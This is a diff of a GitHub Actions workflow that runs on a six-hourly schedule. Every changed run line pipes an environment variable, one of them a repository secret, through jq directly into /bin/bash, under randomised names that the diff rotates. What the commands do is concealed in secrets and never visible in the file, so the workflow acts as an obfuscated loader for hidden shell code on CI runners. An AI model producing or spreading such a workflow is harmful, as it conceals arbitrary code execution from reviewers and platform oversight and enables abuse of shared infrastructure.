@@ -2,28 +2,26 @@ name: hubinyan2009
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 1/6 * * *'
+    - cron: '10 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hubinyan2009
         env:
-          ehopj050: ${{ secrets.ehopj050 }}
+          oimvf86: ${{ secrets.oimvf86 }}
         run: |
-          echo $ehopj050 | jq -r .oe2443 | /bin/bash
-          echo $lufup34 | jq -r .txbn41678 | /bin/bash
-          echo $mu125 | jq -r .yskx662 | /bin/bash
-          echo $tnd55265 | jq -r .k15 | /bin/bash
-          echo $xyf248 | jq -r .giy97 | /bin/bash
-          echo $ej55230 | jq -r .truje045 | /bin/bash
-          echo $rylu93 | jq -r .xvmd88 | /bin/bash
-          echo $yol15149 | jq -r .ccqfv92 | /bin/bash
-          echo $b394 | jq -r .dhlhk97385 | /bin/bash
-          echo $gdzk32 | jq -r .bqfyl952 | /bin/bash
-          echo $blvq3 | jq -r .oi87 | /bin/bash
-          echo $s19259 | jq -r .k14 | /bin/bash
-          echo $xjyg05851 | jq -r .u7750 | /bin/bash
+          echo $oimvf86 | jq -r .msz7347 | /bin/bash
+          echo $u21 | jq -r .bnbbs750 | /bin/bash
+          echo $psod0506 | jq -r .pbts0 | /bin/bash
+          echo $yl61021 | jq -r .d3528 | /bin/bash
+          echo $ajb2996 | jq -r .tm54 | /bin/bash
+          echo $vvf0886 | jq -r .x9 | /bin/bash
+          echo $sy9610 | jq -r .dhtk6556 | /bin/bash
+          echo $x6 | jq -r .fnhor079 | /bin/bash
+          echo $xuq29046 | jq -r .fihks3 | /bin/bash
+          echo $rsz0792 | jq -r .ta09331 | /bin/bash
+          echo $byg4921 | jq -r .bi80698 | /bin/bash
+          echo $at511 | jq -r .pya0 | /bin/bash
 
